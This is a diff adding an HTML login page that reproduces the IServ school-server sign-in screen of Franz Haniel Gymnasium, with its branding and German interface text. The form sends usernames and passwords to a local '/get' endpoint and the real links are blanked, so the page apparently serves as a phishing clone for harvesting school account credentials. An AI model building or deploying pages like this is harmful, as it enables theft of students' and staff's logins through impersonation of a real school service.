@@ -1,0 +1,122 @@
+<html ontouchmove="">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="light dark">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="apple-mobile-web-app-title" content="IServ">
+    <meta name="application-name" content="IServ">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="theme-color" content="#1c4174">
+
+    <title>
+        IServ - franz-haniel-gymnasium.eu
+    </title>
+
+    <link rel="stylesheet" type="text/css" href="iserv.css">
+    <link rel="stylesheet" type="text/css" href="auth.css">
+</head>
+
+<body class="preload p-3  ">
+    <div class="auth-container">
+
+        <header>
+
+
+            <a href="" title="Franz Haniel Gymnasium - franz-haniel-gymnasium.eu">
+                <img class="school-logo  img-responsive" src="logo.jpg" alt="Franz Haniel Gymnasium">
+            </a>
+
+
+        </header>
+
+        <main>
+
+
+
+            <div class="panel main-panel panel-default mb-0">
+                <div class="panel-heading">
+                    <h1 class="panel-title">IServ-Anmeldung</h1>
+                </div>
+                <div class="panel-body">
+                    <div class="alert alert-warning hidden" id="disabled-cookies-box">
+                        Sie haben keine Cookies aktiviert. Cookies sind notwendig um IServ zu benutzen.
+                    </div>
+
+
+                    <form class="login-form" action="/get">
+
+
+
+
+                        <div id="form-username" class="form-group">
+                            <input class="form-control" type="text" name="_username" value="" placeholder="Account"
+                                title="Der Account wird klein geschrieben und darf keine Umlaute enthalten, Leerzeichen werden durch Punkte ersetzt. Beispiel: bjoern.mueller"
+                                required="required" autofocus="" autocapitalize="none" autocorrect="off">
+                        </div>
+
+                        <div id="form-password" class="form-group">
+                            <input class="form-control" type="password" name="_password" placeholder="Passwort"
+                                required="required" aria-describedby="passwordStatus">
+                            <span class="form-control-feedback hidden" aria-hidden="true"><span
+                                    class="glyphicon glyphicon-warning-sign"></span></span>
+                            <span id="passwordStatus" class="text-warning hidden">Warnung: Die Feststelltaste ist
+                                aktiviert!</span>
+                        </div>
+                        <div class="row">
+                            <div class="col-xs-6">
+                                <button class="btn btn-primary" type="submit"><span
+                                        class="glyphicon-pro glyphicon-pro-log-in"></span> Anmelden</button>
+                            </div>
+                            <div class="col-xs-6 text-right">
+                                <div class="checkbox">
+                                    <label><input type="checkbox" id="remember_me" name="_remember_me"> Angemeldet
+                                        bleiben</label>
+                                </div>
+                            </div>
+                        </div>
+                    </form>
+
+                    <hr>
+                    <div class="row">
+                        <div class="col-xs-6">
+                            <a href="">Passwort vergessen?</a>
+                        </div>
+                        <div class="col-xs-6 text-right">
+                            <a href="" target="_blank">Hilfe</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </main>
+
+        <footer>
+
+            <a href="" class="text-center">
+                <picture class="dark">
+                    <source srcset="logo_white.118ffce4.svg" type="image/svg+xml">
+                    <img id="logo-iserv" src="logo_white.ae6b12dc.png" height="66" alt="IServ">
+                </picture>
+                <picture class="light">
+                    <source srcset="logo.a0b67669.svg" type="image/svg+xml">
+                    <img id="logo-iserv" src="logo.c377acd3.png" height="66" alt="IServ">
+                </picture>
+                <p class="mt-3">IServ Schulserver</p>
+            </a>
+
+            <div class="m-3">
+                <a class="legal-notice" href="">Impressum</a>
+            </div>
+
+        </footer>
+
+    </div>
+
+
+
+
+</body>
+
+</html>
